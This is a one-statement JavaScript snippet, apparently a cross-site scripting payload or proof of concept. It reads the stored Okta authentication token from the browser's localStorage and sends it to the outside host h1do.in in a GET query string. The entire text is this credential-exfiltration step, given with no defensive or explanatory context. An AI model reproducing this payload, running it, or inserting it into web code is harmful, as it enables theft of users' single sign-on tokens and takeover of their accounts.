fetch(`https://h1do.in/?oktaToken=${encodeURIComponent(localStorage.getItem('okta-token-storage'))}`, {
  method: 'GET',
});
